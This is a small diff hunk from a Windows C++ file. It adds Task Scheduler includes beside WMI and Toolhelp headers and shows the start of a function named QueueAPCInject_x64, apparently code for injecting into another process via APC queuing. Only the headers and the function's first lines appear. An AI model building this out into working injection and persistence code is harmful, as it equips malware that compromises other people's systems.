@@ -2,9 +2,11 @@
 #include <TlHelp32.h>
 #include <wbemidl.h>
 #include <comutil.h>
+#include <taskschd.h>
 
 #pragma comment(lib, "wbemuuid.lib")
 #pragma comment(lib, "comsuppw.lib")
+#pragma comment(lib, "taskschd.lib")
 
 BOOL QueueAPCInject_x64(HANDLE hProc, PVOID remoteAddr) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
